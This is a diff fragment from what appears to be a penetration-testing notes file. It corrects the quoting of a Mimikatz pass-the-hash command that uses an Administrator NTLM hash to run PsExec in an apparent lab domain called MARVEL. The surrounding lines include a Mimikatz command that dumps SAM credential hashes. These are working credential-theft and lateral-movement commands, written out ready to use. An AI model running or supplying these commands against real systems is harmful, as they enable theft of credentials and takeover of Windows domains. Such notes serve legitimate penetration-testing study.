@@ -151,7 +151,7 @@ invoke-mimikatz -command 'privilege::debug token::elevate lsadump::sam'
 ```
 ### Passing hashes with Mimikatz 
 ```
-Invoke-Mimikatz -command "sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:C:\Users\fcastle\Desktop\PsExec64.exe" 
+Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:C:\Users\fcastle\Desktop\PsExec64.exe"' 
 ```
 
 ## Domain Privilege Escalation 
